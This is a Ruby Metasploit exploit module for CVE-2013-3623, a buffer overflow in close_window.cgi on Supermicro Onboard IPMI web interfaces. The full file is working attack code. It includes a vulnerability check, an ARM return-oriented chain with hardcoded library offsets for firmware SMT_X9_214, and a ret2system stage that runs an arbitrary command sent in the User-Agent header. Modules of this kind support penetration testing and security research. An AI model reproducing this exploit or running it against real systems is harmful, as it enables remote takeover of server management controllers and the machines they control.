# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Supermicro Onboard IPMI close_window.cgi Buffer Overflow&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a buffer overflow on the Supermicro Onboard IPMI controller web
        interface. The vulnerability exists on the close_window.cgi CGI application, and is due
        to the insecure usage of strcpy. In order to get a session, the module will execute
        system() from libc with an arbitrary CMD payload sent on the User-Agent header. This
        module has been tested successfully on Supermicro Onboard IPMI (X9SCL/X9SCM) with firmware
        SMT_X9_214.
      },
      &#039;Author&#039;         =>
        [
          &#039;hdm&#039;, # Vulnerability Discovery and Metasploit module
          &#039;juan vazquez&#039; # Metasploit module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;       => 8000, # Payload sent on the user agent, long enough to fit any payload
          &#039;DisableNops&#039; => true,
          &#039;BadChars&#039;    => (0x00..0x1f).to_a.pack("C*"), # not a big deal, we&#039;re working with ARCH_CMD payloads
          &#039;Compat&#039;      =>
            {
              &#039;PayloadType&#039; => &#039;cmd&#039;,
              &#039;RequiredCmd&#039; => &#039;generic openssl&#039;
            }
        },
      &#039;Platform&#039;       => [&#039;unix&#039;],
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2013-3623&#039; ],
          [ &#039;URL&#039;, &#039;https://community.rapid7.com/community/metasploit/blog/2013/11/06/supermicro-ipmi-firmware-vulnerabilities&#039; ]
        ],
      &#039;Targets&#039;        =>
        [
          [ &#039;Supermicro Onboard IPMI (X9SCL/X9SCM) with firmware SMT_X9_214&#039;,
            {
              :callback => :target_smt_x9_214
            }
          ]
        ],
      &#039;DisclosureDate&#039; => &#039;Nov 06 2013&#039;,
      &#039;DefaultTarget&#039; => 0))

  end

  def send_close_window_request(sess, agent = rand_text_alpha(8))
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => "/cgi/close_window.cgi",
      &#039;agent&#039; => rand_text_alpha(16) + agent,
      &#039;encode_params&#039; => false,
      &#039;vars_post&#039; => {
        &#039;sess_sid&#039; => sess
      }
    })

    return res
  end


  def check
    safe_check = rand_text_alpha(20)
    trigger_check = rand_text_alpha(132)

    res = send_close_window_request(safe_check)

    unless res and res.code == 200 and res.body.to_s =~ /Can&#039;t find action/
      return Exploit::CheckCode::Unknown
    end

    res = send_close_window_request(trigger_check)

    unless res and res.code == 500
      return Exploit::CheckCode::Safe
    end

    return Exploit::CheckCode::Vulnerable
  end

  def target_smt_x9_214
    base_crypt = 0x40074000 # libcrypto.so.0.9.8
    base_libc  = 0x40554000 # libc-2.3.5.so

    buf =  rand_text_alpha(68)
    buf << rand_text_alpha(4)                  # r10
    buf << rand_text_alpha(4)                  # r11
    buf << rand_text_alpha(4)                  # sp
    buf << [base_crypt + 0x39598].pack("V")    # pc # mov pc, r4
    # 2nd stage
    buf << "\x68\xd0\x84\xe2"                  # add   sp, r4, 104                  # make sp point to controlled data in order to accomplish the "ret2system"
    offset = ssl ? 208 : 204                   # when ssl there is an additional environment variable "HTTPS=on"
    buf << [offset].pack("C") + "\x50\x84\xe2" # add   r5, r4, 204                  # make r5 point to pointer to envp
    buf << "\x70\x40\xb5\xe8"                  # ldmfd r5!, {r4, r5, r6, ls}        # store on r4 pointer to envp USER_AGENT pointer
    buf << "\x20\x40\x84\xe2"                  # add   r4, r4, 32                   # to skip the "HTTP_USER_AGENT=" substring and avoid bachars on emulated environment
    buf << "\x40\x80\xbd\xe8"                  # ldmfd sp!, {r6, pc}
    buf << rand_text_alpha(4)                  # R6
    buf << [ base_crypt + 0x3A8BC ].pack("V")  # mov   r0, r4; ldmfd   sp!, {r4,pc} # store in r0 pointer to command
    buf << rand_text_alpha(4)                  # r4
    buf << [ base_libc + 0x3617c ].pack("V")   # system at libc
    buf << rand_text_alpha(128-buf.length)     # padding to reach memory which allows to control r4 when overflow occurs
    # 1st stage: adjust r4 and pc
    buf << "\x80\x40\x44\xe2"                  # sub r4, r4,-128                   # make r4 point to the start of the buffer
    buf << "\x54\xf0\x84\xe2"                  # add pc, r4, 84                    # give control to 2nd stage

    return buf
  end

  def exploit
    buffer = self.send(target[:callback])
    print_status("#{peer} - Sending exploit...")
    send_close_window_request(buffer, payload.encoded)
  end

end

